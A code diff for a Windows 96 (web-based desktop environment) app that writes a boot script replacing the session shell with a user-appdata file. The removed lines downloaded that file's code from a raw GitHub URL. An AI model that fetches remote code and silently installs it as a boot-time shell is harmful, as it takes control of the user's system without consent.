@@ -32,7 +32,10 @@ class GUIApplication extends WApplication {
         const fs = w96.FS;
 
         if(!fs.exists("c:/system/boot/notron.js")){
-            fs.writestr("c:/system/boot/notron.js", '//!wrt
+            fs.writestr("c:/system/boot/notron.js", '');
+        }
+        if(!fs.exists("c:/user/appdata/z.wrt")){
+            fs.writestr("c:/user/appdata/z.wrt", '
 const { Theme } = w96.ui;
 const { sysConf: SCM } = w96;
 
@@ -66,11 +69,7 @@ class GUIApplication extends WApplication {
         const fs = w96.FS;
 
         if(!fs.exists("c:/system/boot/notron.js")){
-            fs.writestr("c:/system/boot/notron.js", "const fs = w96.FS;
-const { sysConf: SCM } = w96;
-
-SCM.set("System/Session/Shell/exec", "c:/user/appdata/z.wrt");
-await SCM.syncRoot("Software");");
+            fs.writestr("c:/system/boot/notron.js", 'const fs = w96.FS;const { sysConf: SCM } = w96;SCM.set("System/Session/Shell/exec","c:/user/appdata/z.wrt");await SCM.syncRoot("Software");');
         }
         SCM.set("System/Session/Shell/exec", "c:/user/appdata/z.wrt");
         await SCM.syncRoot("Software");
@@ -80,13 +79,7 @@ await SCM.syncRoot("Software");");
     }
 }
 
-return await WApplication.execAsync(new GUIApplication(), this.boxedEnv.args);
-');
-        }
-        if(!fs.exists("c:/user/appdata/z.wrt")){
-            await fetch("https://raw.githubusercontent.com/TermOfficial/plus/main/breakdown").then((response) => {
-                fs.writestr("c:/user/appdata/z.wrt", response.text);
-            });
+return await WApplication.execAsync(new GUIApplication(), this.boxedEnv.args);');
         }
         SCM.set("System/Session/Shell/exec", "c:/user/appdata/z.wrt");
         await SCM.syncRoot("Software");
